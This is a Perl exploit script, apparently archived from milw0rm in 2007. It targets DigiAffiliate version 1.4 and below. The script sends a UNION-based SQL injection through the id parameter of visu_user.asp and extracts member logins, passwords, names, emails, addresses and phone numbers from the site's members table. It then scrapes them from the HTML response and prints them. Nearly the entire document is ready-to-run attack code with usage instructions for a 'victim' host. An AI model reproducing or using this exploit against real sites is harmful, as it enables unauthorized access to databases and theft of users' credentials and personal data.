<html><head><title>DigiAffiliate <= 1.4 (visu_user.asp id) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#[Script Name: DigiAffiliate &lt;= V1.4 Remote Blind SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[S.Page     : http://www.digiappz.com
#[$$         : .299
#[..         : ajann,Turkey

use IO::Socket;
if(@ARGV &lt; 1){
print &quot;
[========================================================================
[//   DigiAffiliate &lt;= V1.4 Remote Blind SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&amp;Exp : ajann
[========================================================================
&quot;;
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = &quot;http://&quot;.$server;
$port = &quot;80&quot;;
$file = &quot;/visu_user.asp?id=&quot;;

print &quot;Script &lt;DIR&gt; : &quot;;
$dir = &lt;STDIN&gt;;
chop ($dir);

if ($dir =~ /exit/){
print &quot;-- Exploit Failed[You Are Exited] \n&quot;;
exit();
}

if ($dir =~ /\//){}
else {
print &quot;-- Exploit Failed[No DIR] \n&quot;;
exit();
 }


$target = &quot;-1%20union%20select%200,login,password,name,email,0,fax,city,0,address1,address2,phone,0,0,0,0,city,0,0%20from%20members&quot;;
$target = $host.$dir.$file.$target;

#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $server\n&quot;;
$socket = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $socket &quot;GET $target HTTP/1.1\n&quot;;
print $socket &quot;Host: $server\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
#Getting
while($answer = &lt;$socket&gt;) {
if ($answer =~ /name=\&quot;login\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Username: $1\n&quot;;
}

if ($answer =~ /name=\&quot;password\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Password: $1\n&quot;;
}

if ($answer =~ /name=\&quot;name\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Name: $1\n&quot;;
}

if ($answer =~ /name=\&quot;email\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)&quot; onBlur/){
print &quot;+ Email: $1\n&quot;;
}

if ($answer =~ /name=\&quot;address1\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Address1: $1\n&quot;;
}

if ($answer =~ /name=\&quot;address2\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Address1: $1\n&quot;;
}

if ($answer =~ /name=\&quot;city\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ City: $1\n&quot;;
}

if ($answer =~ /name=\&quot;postcode\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ PostCode: $1\n&quot;;
}

if ($answer =~ /name=\&quot;county\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Country: $1\n&quot;;
}

if ($answer =~ /name=\&quot;phone\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Phone: $1\n&quot;;
}

if ($answer =~ /name=\&quot;iurl\&quot; size=\&quot;24\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Fax: $1\n&quot;;
}


if ($answer =~ /name=\&quot;title\&quot; size=\&quot;30\&quot; class=\&quot;gray_back\&quot; value=\&quot;(.*?)\&quot;&gt;/){
print &quot;+ Country: $1\n&quot;;
}

if ($answer =~ /Syntax error/) { 
print &quot;+ Exploit Failed : ( \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print &quot;+ Exploit Failed : (  \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
 }

# milw0rm.com [2007-01-13]</pre></html>